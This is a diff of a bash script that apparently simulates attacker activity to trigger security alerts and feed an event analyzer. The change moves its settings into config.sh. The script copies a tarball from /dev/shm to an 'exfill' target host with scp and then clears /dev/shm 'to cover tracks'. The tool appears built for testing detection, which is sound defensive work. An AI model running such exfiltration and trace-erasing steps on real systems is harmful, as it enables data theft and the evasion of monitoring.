@@ -1,9 +1,7 @@
 #!/bin/bash
 
-ROOTDIR='' # Base directory from which all of these alert triggers will be run on the target host
-HOMEDIR='' # Your home directory where your ssh keys are
-EXFILL_TARGET='' # Where the scp command will attempt to "exfill" the data
-FILE='/dev/shm/totally_not_exfill.tar.gz'
+# Load shared variables from config.sh
+source "$(dirname "$0")/config.sh"
 
 # Generate some random noise for the Event Analyzer view
 /usr/bin/whoami &>/dev/null
@@ -41,7 +39,7 @@ for i in {1..4}; do
 done
 
 if [ -f "$FILE" ]; then
-  /usr/bin/scp -i $ROOTDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
+  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
 fi
 
 # Remove all files from /dev/shm to cover tracks.
